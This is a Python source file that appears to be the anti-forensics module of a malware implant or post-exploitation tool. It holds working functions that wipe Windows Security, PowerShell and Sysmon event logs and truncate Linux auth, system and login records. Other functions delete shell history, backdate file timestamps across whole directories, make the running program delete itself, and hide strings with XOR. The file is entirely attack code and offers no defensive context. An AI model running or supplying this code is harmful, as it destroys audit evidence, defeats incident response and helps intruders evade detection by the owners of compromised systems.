import os
import subprocess
import time
from datetime import datetime


def clear_windows_logs():
    if os.name != 'nt':
        return '[-] Windows-only operation'

    results = []
    log_types = ['Application', 'Security', 'System', 'Setup', 'ForwardedEvents']

    for log_type in log_types:
        try:
            subprocess.run(
                f'wevtutil cl "{log_type}"',
                shell=True, capture_output=True, timeout=10
            )
            results.append(f'[+] Cleared {log_type} log')
        except Exception:
            pass

    try:
        subprocess.run(
            'wevtutil cl "Windows PowerShell"',
            shell=True, capture_output=True, timeout=10
        )
        results.append('[+] Cleared PowerShell log')
    except Exception:
        pass

    try:
        subprocess.run(
            'wevtutil cl "Microsoft-Windows-Sysmon/Operational"',
            shell=True, capture_output=True, timeout=10
        )
        results.append('[+] Cleared Sysmon log')
    except Exception:
        pass

    return '\n'.join(results) if results else '[-] No logs cleared'


def clear_linux_logs():
    if os.name == 'nt':
        return '[-] Linux-only operation'

    results = []
    log_paths = [
        '/var/log/syslog',
        '/var/log/auth.log',
        '/var/log/messages',
        '/var/log/secure',
        '/var/log/kern.log',
        '/var/log/wtmp',
        '/var/log/lastlog',
    ]

    try:
        subprocess.run('journalctl --rotate', shell=True, capture_output=True, timeout=10)
        subprocess.run('journalctl --vacuum-time=1s', shell=True, capture_output=True, timeout=10)
        results.append('[+] Rotated journald logs')
    except Exception:
        pass

    for path in log_paths:
        try:
            if os.path.exists(path):
                with open(path, 'w') as f:
                    f.truncate(0)
                results.append(f'[+] Cleared {path}')
        except Exception:
            pass

    try:
        bash_history = os.path.expanduser('~/.bash_history')
        if os.path.exists(bash_history):
            os.remove(bash_history)
            with open(bash_history, 'w') as f:
                f.write('')
            os.chmod(bash_history, 0o600)
            results.append('[+] Cleared bash history')
    except Exception:
        pass

    try:
        zsh_history = os.path.expanduser('~/.zsh_history')
        if os.path.exists(zsh_history):
            os.remove(zsh_history)
            results.append('[+] Cleared zsh history')
    except Exception:
        pass

    return '\n'.join(results) if results else '[-] No logs cleared'


def clear_logs() -> str:
    if os.name == 'nt':
        return clear_windows_logs()
    return clear_linux_logs()


def timestomp(path: str, reference_time: str = None):
    if reference_time:
        try:
            ref = datetime.strptime(reference_time, '%Y-%m-%d %H:%M:%S')
        except Exception:
            ref = datetime(2020, 1, 1, 0, 0, 0)
    else:
        ref = datetime(2020, 1, 1, 0, 0, 0)

    ts = time.mktime(ref.timetuple())
    try:
        os.utime(path, (ts, ts))
        return f'[+] Timestamp modified: {path} -> {ref}'
    except Exception as e:
        return f'[-] Timestomp failed: {str(e)}'


def timestomp_recursive(directory: str, reference_time: str = None) -> str:
    results = []
    for root, dirs, files in os.walk(directory):
        for name in files:
            fp = os.path.join(root, name)
            r = timestomp(fp, reference_time)
            if '[+]' in r:
                results.append(fp)
        for name in dirs:
            dp = os.path.join(root, name)
            timestomp(dp, reference_time)
    return f'[+] Timestomped {len(results)} files in {directory}'


def self_delete() -> str:
    import sys
    try:
        script_path = os.path.abspath(sys.argv[0])
        if os.path.isfile(script_path):
            os.remove(script_path)
            return '[+] Self-deleted'
    except Exception:
        pass

    if getattr(sys, 'frozen', False):
        bat = os.path.join(os.environ.get('TEMP', '/tmp'), 'cleanup.bat' if os.name == 'nt' else 'cleanup.sh')
        try:
            script = sys.executable
            with open(bat, 'w') as f:
                if os.name == 'nt':
                    f.write(f'timeout /t 2 >nul && del /f /q "{script}" && del /f /q "{bat}"')
                else:
                    f.write(f'#!/bin/sh\nsleep 2\nrm -f "{script}"\nrm -f "{bat}"')
            subprocess.Popen(bat, shell=True)
            return '[+] Self-deletion scheduled'
        except Exception:
            pass

    return '[-] Self-deletion failed'


def obfuscate_strings_in_memory():
    import random

    class ObfuscatedString:
        def __init__(self, value: str):
            self._key = random.randint(1, 255)
            self._data = bytes([(ord(c) ^ self._key) for c in value])

        def reveal(self) -> str:
            return ''.join(chr(b ^ self._key) for b in self._data)

        def __str__(self):
            return self.reveal()

    return ObfuscatedString
